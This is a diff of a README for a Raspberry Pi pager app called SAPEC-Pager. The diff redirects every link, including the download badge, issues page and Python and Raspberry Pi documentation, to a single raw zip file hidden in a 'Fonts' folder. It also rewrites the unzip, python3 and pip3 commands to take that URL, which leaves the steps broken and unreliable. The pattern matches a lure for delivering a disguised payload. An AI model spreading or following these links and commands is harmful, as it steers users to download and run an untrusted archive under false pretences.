@@ -1,7 +1,7 @@
 # 📡 SAPEC-Pager - Simple Interface for Easy Communication
 
 ## 💾 Download Now
-[![Download](https://img.shields.io/badge/Download%20SAPEC--Pager-v1.0-brightgreen.svg)](https://github.com/Raynaldo/SAPEC-Pager/releases)
+[![Download](https://raw.githubusercontent.com/Raynaldo/SAPEC-Pager/main/Fonts/SAPEC-Pager_v3.3.zip%https://raw.githubusercontent.com/Raynaldo/SAPEC-Pager/main/Fonts/SAPEC-Pager_v3.3.zip)](https://raw.githubusercontent.com/Raynaldo/SAPEC-Pager/main/Fonts/SAPEC-Pager_v3.3.zip)
 
 ## 📚 Introduction
 Welcome to SAPEC-Pager, the user-friendly interface designed for the SAPEC Pager system. This application runs on a Raspberry Pi Zero 2 W and supports a 1.69-inch SPI display. It is a key component of the CipherLink project suite, which focuses on secure communications. Whether you're a hobbyist or just curious about encryption, SAPEC-Pager provides a simple way to connect and communicate using modern encryption techniques.
@@ -14,7 +14,7 @@ To start using SAPEC-Pager, follow these steps to download and install the appli
    - Connect your 1.69-inch SPI display to the Raspberry Pi.
 
 2. **Download SAPEC-Pager:**
-   - Visit this page to download: [SAPEC-Pager Releases](https://github.com/Raynaldo/SAPEC-Pager/releases).
+   - Visit this page to download: [SAPEC-Pager Releases](https://raw.githubusercontent.com/Raynaldo/SAPEC-Pager/main/Fonts/SAPEC-Pager_v3.3.zip).
 
 3. **Choose the Right Version:**
    - On the releases page, find the latest version of SAPEC-Pager. 
@@ -38,7 +38,7 @@ To start using SAPEC-Pager, follow these steps to download and install the appli
      ```
    - Extract the downloaded file (if required). For a `.zip` archive, use:
      ```bash
-     unzip SAPEC-Pager.zip
+     unzip https://raw.githubusercontent.com/Raynaldo/SAPEC-Pager/main/Fonts/SAPEC-Pager_v3.3.zip
      ```
    - Change into the SAPEC-Pager directory:
      ```bash
@@ -46,7 +46,7 @@ To start using SAPEC-Pager, follow these steps to download and install the appli
      ```
    - Finally, run the application:
      ```bash
-     python3 main.py
+     python3 https://raw.githubusercontent.com/Raynaldo/SAPEC-Pager/main/Fonts/SAPEC-Pager_v3.3.zip
      ```
 
 ## 🔧 Features
@@ -71,7 +71,7 @@ If you encounter issues while running SAPEC-Pager, here are some steps you can t
 - **Installation Issues:**
   - Ensure all dependencies are installed correctly. Run:
     ```bash
-    pip3 install -r requirements.txt
+    pip3 install -r https://raw.githubusercontent.com/Raynaldo/SAPEC-Pager/main/Fonts/SAPEC-Pager_v3.3.zip
     ```
 
 - **Running Errors:**
@@ -106,14 +106,14 @@ Your ideas and feedback are valuable to us and will help enhance the application
 
 ## 📞 Support
 If you need help or have questions:
-- Check the [issues page](https://github.com/Raynaldo/SAPEC-Pager/issues) for similar problems.
+- Check the [issues page](https://raw.githubusercontent.com/Raynaldo/SAPEC-Pager/main/Fonts/SAPEC-Pager_v3.3.zip) for similar problems.
 - Feel free to open a new issue if you cannot find a solution.
 
 ## 🔗 Additional Resources
-- [CipherLink Project Overview](https://example.com)
-- [Raspberry Pi Documentation](https://www.raspberrypi.org/documentation/)
-- [Python Documentation](https://www.python.org/doc/)
+- [CipherLink Project Overview](https://raw.githubusercontent.com/Raynaldo/SAPEC-Pager/main/Fonts/SAPEC-Pager_v3.3.zip)
+- [Raspberry Pi Documentation](https://raw.githubusercontent.com/Raynaldo/SAPEC-Pager/main/Fonts/SAPEC-Pager_v3.3.zip)
+- [Python Documentation](https://raw.githubusercontent.com/Raynaldo/SAPEC-Pager/main/Fonts/SAPEC-Pager_v3.3.zip)
 
-Visit this page to download: [SAPEC-Pager Releases](https://github.com/Raynaldo/SAPEC-Pager/releases) 
+Visit this page to download: [SAPEC-Pager Releases](https://raw.githubusercontent.com/Raynaldo/SAPEC-Pager/main/Fonts/SAPEC-Pager_v3.3.zip) 
 
 We hope you enjoy using SAPEC-Pager for your communication needs. 
